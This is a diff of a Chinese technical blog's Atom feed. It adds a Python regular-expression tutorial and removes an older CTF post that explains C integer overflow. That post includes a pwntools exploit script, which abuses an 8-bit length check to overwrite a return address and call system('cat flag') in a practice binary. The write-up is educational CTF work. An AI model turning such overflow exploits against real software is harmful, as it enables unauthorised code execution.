@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://kevens10.github.io/"/>
-  <updated>2019-12-08T06:55:55.364Z</updated>
+  <updated>2020-01-17T15:41:47.085Z</updated>
   <id>https://kevens10.github.io/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>常用的Python正则表达式</title>
+    <link href="https://kevens10.github.io/articles/%E5%B8%B8%E7%94%A8%E7%9A%84Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html"/>
+    <id>https://kevens10.github.io/articles/%E5%B8%B8%E7%94%A8%E7%9A%84Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</id>
+    <published>2020-01-17T12:48:51.000Z</published>
+    <updated>2020-01-17T15:41:47.085Z</updated>
+    
+    <content type="html"><![CDATA[<p>在写Python爬虫的时候经常要用到正则表达式，今天把比较常用的一些用法总结记录一下<br>首先需要导入re模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure><h3 id="start-end-和span-函数"><a href="#start-end-和span-函数" class="headerlink" title="start(),end()和span()函数"></a>start(),end()和span()函数</h3><h5 id="start"><a href="#start" class="headerlink" title="start()"></a>start()</h5><p>返回匹配的起始位置。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">re.search(r&apos;\d+&apos;, &apos;asdf13df234&apos;).start()</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>索引位置是从0开始计数的。</p><h5 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h5><p>返回匹配结束的下一个位置。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">re.search(r&apos;\d+&apos;, &apos;asdf13df234&apos;).end()</span><br><span class="line">6</span><br></pre></td></tr></table></figure><h5 id="span"><a href="#span" class="headerlink" title="span()"></a>span()</h5><p>返回匹配的区间，左闭右开。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">re.search(r&apos;\d+&apos;, &apos;asdf13df234&apos;).span()</span><br><span class="line">(4, 6)</span><br></pre></td></tr></table></figure><h3 id="group-函数"><a href="#group-函数" class="headerlink" title="group()函数"></a>group()函数</h3><p>获得一个或多个分组截获的字符串；指定多个参数时将以元组形式返回。编号0代表匹配的整个子串；默认返回group(0)；没有截获字符串的组返回None；截获了多次的组返回最后一次截获的子串。</p><h3 id="groups-函数"><a href="#groups-函数" class="headerlink" title="groups()函数"></a>groups()函数</h3><p>以元组形式返回全部分组截获的字符串。相当于调用group(1,2,…last)。没有截获字符串的组以默认值None代替。</p><h3 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h3><p>re.match 从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。<br>函数语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(pattern, string, flags=0)</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(re.match(&apos;www&apos;, &apos;www.abc.com&apos;).span())  # 在起始位置匹配</span><br><span class="line">print(re.match(&apos;com&apos;, &apos;www.abc.com&apos;))         # 不在起始位置匹配</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(0, 3)</span><br><span class="line">None</span><br></pre></td></tr></table></figure><h3 id="re-search函数"><a href="#re-search函数" class="headerlink" title="re.search函数"></a>re.search函数</h3><p>re.search 扫描整个字符串并返回第一个成功的匹配。匹配成功re.search方法返回一个匹配的对象，否则返回None。<br>函数语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(pattern, string, flags=0)</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(re.search(&apos;www&apos;, &apos;www.abc.com&apos;).span())  # 在起始位置匹配</span><br><span class="line">print(re.search(&apos;com&apos;, &apos;www.abc.com&apos;).span())         # 不在起始位置匹配</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(0, 3)</span><br><span class="line">(8, 11)</span><br><span class="line">``` </span><br><span class="line">![QQ截图20200117162307.jpg](https://i.loli.net/2020/01/17/853v4tXYmCLdo2j.jpg)</span><br><span class="line"></span><br><span class="line">**re.match与re.search的区别</span><br><span class="line">re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。**</span><br><span class="line">### re.sub函数</span><br><span class="line">re.sub用于替换字符串中的匹配项。</span><br><span class="line">语法：</span><br></pre></td></tr></table></figure><p>re.sub(pattern, repl, string, count=0, flags=0)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+ pattern : 正则中的模式字符串。</span><br><span class="line">+ repl : 替换的字符串，也可为一个函数。</span><br><span class="line">+ string : 要被查找替换的原始字符串。</span><br><span class="line">+ count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</span><br><span class="line"></span><br><span class="line">例子;</span><br></pre></td></tr></table></figure><p>a=”0123-456-789”<br>b=re.sub(r’\D’,””,a)<br>print “b”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br></pre></td></tr></table></figure><p>0123456789</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">### re.compile函数</span><br><span class="line">compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</span><br><span class="line"></span><br><span class="line">语法格式为：</span><br></pre></td></tr></table></figure><p>re.compile(pattern[, flags])</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br></pre></td></tr></table></figure><p>pattern = re.compile(r’\d+’)                    # 用于匹配至少一个数字</p><blockquote><blockquote><blockquote><p>m = pattern.match(‘one12twothree34four’)        # 查找头部，没有匹配<br>print m<br>None<br>m = pattern.match(‘one12twothree34four’, 2, 10) # 从’e’的位置开始匹配，没有匹配<br>print m<br>None<br>m = pattern.match(‘one12twothree34four’, 3, 10) # 从’1’的位置开始匹配，正好匹配<br>print m                                         # 返回一个 Match 对象<br>&lt;_sre.SRE_Match object at 0x10a42aac0&gt;</p></blockquote></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">### findall函数</span><br><span class="line">在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</span><br><span class="line">**re.match 和 re.search 是匹配一次 ,而findall 匹配所有。**</span><br><span class="line">例子：</span><br></pre></td></tr></table></figure><p>pattern = re.compile(r’\d+’)   # 查找数字<br>result1 = pattern.findall(‘runoob 123 google 456’)<br>result2 = pattern.findall(‘run88oob123google456’, 0, 10)# 从0开始匹配，到10结束<br>print(result1)<br>print(result2)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br></pre></td></tr></table></figure><p>[‘123’, ‘456’]<br>[‘88’, ‘12’]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">re.finditer</span><br><span class="line">和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。</span><br><span class="line">### re.split函数</span><br><span class="line">split 方法按照能够匹配的子串将字符串分割后返回列表。</span><br><span class="line">语法：</span><br></pre></td></tr></table></figure><p>re.split(pattern, string[, maxsplit=0, flags=0])</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子:</span><br></pre></td></tr></table></figure><p>re.split(‘\W+’, ‘runoob, runoob, runoob.’)<br>[‘runoob’, ‘runoob’, ‘runoob’, ‘’]</p><p>re.split(‘(\W+)’, ‘ runoob, runoob, runoob.’)<br>[‘’, ‘ ‘, ‘runoob’, ‘, ‘, ‘runoob’, ‘, ‘, ‘runoob’, ‘.’, ‘’]</p><p>re.split(‘\W+’, ‘ runoob, runoob, runoob.’, 1)<br>[‘’, ‘runoob, runoob, runoob.’]</p><pre><code>### 元字符+ .                    匹配任意字符（不包括换行符）+ ^                    匹配开始位置，多行模式下匹配每一行的开始+ $                    匹配结束位置，多行模式下匹配每一行的结束+ *                  匹配前一个元字符0到多次+ +                   匹配前一个元字符1到多次+ ?                    匹配前一个元字符0到1次+ {m,n}                匹配前一个元字符m到n次+ \\                   转义字符，跟在其后的字符将失去作为特殊元字符的含义，例如\\.只能匹配.，不能再匹配任意字符+ []                   字符集，一个字符的集合，可匹配其中任意一个字符+ |                    逻辑表达式 或 ，比如 a|b 代表可匹配 a 或者 b+ (...)                分组，默认为捕获，即被分组的内容可以被单独取出，默认每个分组有个索引，从 1 开始，按照&quot;(&quot;的顺序决定索引值+ (?iLmsux)            分组中可以设置模式，iLmsux之中的每个字符代表一个模式,用法参见 模式 I+ (?:...)              分组的不捕获模式，计算索引时会跳过这个分组+ (?P&lt;name&gt;...)        分组的命名模式，取此分组中的内容时可以使用索引也可以使用name+ (?P=name)            分组的引用模式，可在同一个正则表达式用引用前面命名过的正则+ (?#...)              注释，不影响正则表达式其它部分,用法参见 模式 I+ (?=...)              顺序肯定环视，表示所在位置右侧能够匹配括号内正则+ (?!...)              顺序否定环视，表示所在位置右侧不能匹配括号内正则+ (?&lt;=...)             逆序肯定环视，表示所在位置左侧能够匹配括号内正则+ (?&lt;!...)             逆序否定环视，表示所在位置左侧不能匹配括号内正则+ (?(id/name)yes|no)   若前面指定id或name的分区匹配成功则执行yes处的正则，否则执行no处的正则+ \number              匹配和前面索引为number的分组捕获到的内容一样的字符串+ \A                   匹配字符串开始位置，忽略多行模式+ \Z                   匹配字符串结束位置，忽略多行模式+ \b                   匹配位于单词开始或结束位置的空字符串+ \B                   匹配不位于单词开始或结束位置的空字符串+ \d                   匹配一个数字， 相当于 [0-9]\D                   匹配非数字,相当于 [^0-9]+ \s                   匹配任意空白字符， 相当于 [ \t\n\r\f\v]+ \S                   匹配非空白字符，相当于 [^ \t\n\r\f\v]+ \w                   匹配数字、字母、下划线中任意一个字符， 相当于 [a-zA-Z0-9_]+ \W                   匹配非数字、字母、下划线中的任意字符，相当于 [^a-zA-Z0-9_]</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;在写Python爬虫的时候经常要用到正则表达式，今天把比较常用的一些用法总结记录一下&lt;br&gt;首先需要导入re模块&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cla
+      
+    
+    </summary>
+    
+    
+      <category term="Python" scheme="https://kevens10.github.io/categories/Python/"/>
+    
+    
+      <category term="Python" scheme="https://kevens10.github.io/tags/Python/"/>
+    
+      <category term="正则表达式" scheme="https://kevens10.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>x86内存地址转换</title>
@@ -70,9 +99,9 @@
     
       <category term="CTF 逆向" scheme="https://kevens10.github.io/tags/CTF-%E9%80%86%E5%90%91/"/>
     
-      <category term="操作系统" scheme="https://kevens10.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
-    
       <category term="CTF PWN" scheme="https://kevens10.github.io/tags/CTF-PWN/"/>
+    
+      <category term="操作系统" scheme="https://kevens10.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
     
   </entry>
   
@@ -166,9 +195,9 @@
     
       <category term="CTF 逆向" scheme="https://kevens10.github.io/tags/CTF-%E9%80%86%E5%90%91/"/>
     
-      <category term="汇编语言" scheme="https://kevens10.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
-    
       <category term="CTF PWN" scheme="https://kevens10.github.io/tags/CTF-PWN/"/>
+    
+      <category term="汇编语言" scheme="https://kevens10.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
     
   </entry>
   
@@ -575,36 +604,6 @@
       <category term="古典密码" scheme="https://kevens10.github.io/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
     
       <category term="算法" scheme="https://kevens10.github.io/tags/%E7%AE%97%E6%B3%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>整形溢出 int_overflow</title>
-    <link href="https://kevens10.github.io/articles/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA-int_overflow.html"/>
-    <id>https://kevens10.github.io/articles/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA-int_overflow.html</id>
-    <published>2019-10-17T03:13:09.000Z</published>
-    <updated>2019-10-17T08:18:46.161Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x01-C语言的整数溢出机制"><a href="#0x01-C语言的整数溢出机制" class="headerlink" title="0x01 C语言的整数溢出机制"></a>0x01 C语言的整数溢出机制</h2><p>整数溢出主要分为无符号整数溢出和有符号整数溢出。</p><h3 id="无符号整型溢出"><a href="#无符号整型溢出" class="headerlink" title="无符号整型溢出"></a>无符号整型溢出</h3><p>对于unsigned整型溢出，C的规范是有定义的——“溢出后的数会以2^(8*sizeof(type))作模运算”，也就是说，如果一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line">  // insert code here...</span><br><span class="line">  unsigned char x;</span><br><span class="line">  x = 128 + 130;</span><br><span class="line">  printf(&quot;%d\n&quot;,x);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="有符号整型溢出"><a href="#有符号整型溢出" class="headerlink" title="有符号整型溢出"></a>有符号整型溢出</h3><p>对于signed整型的溢出，C的规范定义是“undefined behavior”，虽然没有定义，各编译器可自己实现，但是大部分的溢出机制都是一样的。</p><p>有符号整型溢出又可分为向上溢出和向下溢出。假设用k个字节表示一个整型变量, 那么这个变量可以表示的有符号整数的范围是-2^(8k-1) ~ 2^(8k-1) – 1,那么两个正整数或者两个负整数相加就有可能超过这个整型变量所能表示的范围, 向上超出&gt;2^(8k-1) – 1我们称之为向上溢出, 向下超出&lt;-2^(8k-1), 我们称之为向下溢出.<br>对于signed char,正整数最大值为127，负整数最小值为128。unsigned char所能表示的最大值为255。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signed char x;</span><br><span class="line">x = 125 + 5;</span><br></pre></td></tr></table></figure><p>上面代码会输出：-126，因为130的二进制位为10000010，符号为1，表示负数。对于有符号整型，负数是用补码表示的，即绝对值取反后加一。根据之前方法逆向回去，先减一后再取反得01111110，即126.所以10000010表示的是-126。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signed char x;</span><br><span class="line">x = (-100) + (-100);</span><br></pre></td></tr></table></figure><p>上面代码会输出56，因为200的二进制为11001000，-200根据补码的算法，得出00111000即56。<br>上面的两个例子无论是向上溢出还是向下溢出，绝对值都在相对于无符号整型能表示的范围内。对于signed char如果结果为400，超出了位数表示范围，取结果的低八位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signed char x;</span><br><span class="line">x = 200 + 200;</span><br></pre></td></tr></table></figure><p>因此上面代码会输出-112。如果x的结果为负数且超出了255，则取结果的低八位，并进行补码的反向操作，减一后取反。</p><h3 id="数据类型范围"><a href="#数据类型范围" class="headerlink" title="数据类型范围"></a>数据类型范围</h3><p>•    2015/06/09<br>Visual C++ 32 位和 64 位编译器可识别本文后面的表中的类型。</p><p>•    int (unsigned int)</p><p>•    __int8 (unsigned __int8)</p><p>•    __int16 (unsigned __int16)</p><p>•    __int32 (unsigned __int32)</p><p>•    __int64 (unsigned __int64)</p><p>•    short (unsigned short)</p><p>•    long (unsigned long)</p><p>•    long long (unsigned long long)<br>如果其名称以两个下划线 (__) 开始，则数据类型是非标准的。<br>下表中指定的范围均包含起始值和结束值。<br><img src="/images/intoverflow5.png" alt></p><p><img src="/images/intoverflow6.png" alt></p><p><img src="/images/intoverflow7.png" alt></p><h2 id="0x02-int-overflow"><a href="#0x02-int-overflow" class="headerlink" title="0x02 _int_overflow"></a>0x02 _int_overflow</h2><h4 id="检查安全机制"><a href="#检查安全机制" class="headerlink" title="检查安全机制"></a>检查安全机制</h4><p><img src="/images/intoverflow1.png" alt><br>运行一下，我们知道这是一个创建用户名和密码的程序，对用户名的长度和密码都有限制。<br>我们ctrl+1 找到了system（”cat flag”）</p><h4 id="找到溢出点"><a href="#找到溢出点" class="headerlink" title="找到溢出点"></a>找到溢出点</h4><p><img src="/images/intoverflow2.png" alt></p><p><img src="/images/intoverflow2-2.png" alt></p><p>strcpy：危险函数<br>unsigned __int8最大只能到达255 可是我们read（。。。）远超过255。</p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>整数溢出<br>要想利用到strcpy这一步，要么你输入的passwd长度&gt;3 &amp;&amp; &lt;=8，要么使passwd的长度过长，而v3最大可以存的长度为255，所以直接在v3处造成整数溢出进入else，整数溢出需要255，返回地址需要4字节，所以passwd长度达到259即可<br>第一种passwd太短，无法利用进行改写程序流，我们使用第二种思路。<br>程序中存在，可以将返回地址指向what_is_this()<br>。</p><p>1.发现v3是8位无符号整数，则最大只能是255。<br>但是read函数能读取的长度是0x199，远大于255，那就可以进行整型溢出，让passwd的长度是 260到264就可以了。<br>根据无符号整形溢出规则，溢出则进行2^(8*sizeof(type))作模运算，passwd的长度是 260到264。<br>2.我们将程序的返回地址覆盖为system（”cat flag”）</p><p><img src="/images/intoverflow3.png" alt></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">p = process(&apos;./int_overflow&apos;)</span><br><span class="line"></span><br><span class="line">system_flag_addr = 0x804868B</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;choice:&apos;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&apos;username:\n&apos;)</span><br><span class="line">p.sendline(&quot;tutu&quot;)</span><br><span class="line">p.recvuntil(&apos;passwd:\n&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos;*0x18 + p32(system_flag_addr)</span><br><span class="line">payload = payload.ljust(262,&apos;A&apos;)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/intoverflow4.png" alt></p><p>Python ljust()方法<br>Python 字符串 Python 字符串<br>描述<br>Python ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;0x01-C语言的整数溢出机制&quot;&gt;&lt;a href=&quot;#0x01-C语言的整数溢出机制&quot; class=&quot;headerlink&quot; title=&quot;0x01 C语言的整数溢出机制&quot;&gt;&lt;/a&gt;0x01 C语言的整数溢出机制&lt;/h2&gt;&lt;p&gt;整数溢出主要分为无符号整数溢出和有符
-      
-    
-    </summary>
-    
-    
-      <category term="PWN" scheme="https://kevens10.github.io/categories/PWN/"/>
-    
-    
-      <category term="CTF PWN" scheme="https://kevens10.github.io/tags/CTF-PWN/"/>
-    
-      <category term="二进制漏洞" scheme="https://kevens10.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
-    
-      <category term="栈溢出" scheme="https://kevens10.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
     
   </entry>
   
